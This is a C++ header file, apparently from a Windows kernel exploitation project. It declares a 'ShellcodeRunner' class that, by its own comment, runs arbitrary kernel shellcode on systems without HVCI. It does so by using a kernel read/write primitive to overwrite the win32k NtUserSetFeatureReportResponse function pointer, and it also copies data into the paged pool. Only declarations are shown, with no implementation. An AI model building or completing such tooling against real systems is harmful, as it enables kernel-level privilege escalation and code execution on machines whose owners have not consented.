#pragma once

#include <tuple>

#include "KernelPrimitives.h"

typedef ULONG64(*NtUserSetFeatureReportResponse_t)(ULONG64, ULONG64, ULONG32);


/*
	Runs arbitrary kernel shellcode on a non-HVCI system.
*/
class ShellcodeRunner {
public:
	ShellcodeRunner(KernelReadWrite* ReadWrite);

	VOID RunShellcode(const PVOID Shellcode, ULONG ShellcodeLength, ULONG64 Param1 = 0, ULONG64 Param2 = 0, ULONG32 Param3 = 0);

	/*
		Runs a function with the signature
			__int64 f(__int64, __int64, int)

		By overriding NtUserSetFeatureReportResponse
	*/
	ULONG64 RunFunction(ULONG64 NewPointer, ULONG64 Param1, ULONG64 Param2, ULONG32 Param3);

	/*
		Copies data to the paged pool.
	*/
	PVOID CopyToPool(const PVOID Source, ULONG Size);

	~ShellcodeRunner();

private:
	KernelReadWrite* rw;
	ULONG64 originalFunction;
	ULONG64 win32kBase;
	ULONG64 kernelBase;
	NtUserSetFeatureReportResponse_t NtUserSetFeatureReportResponse;
};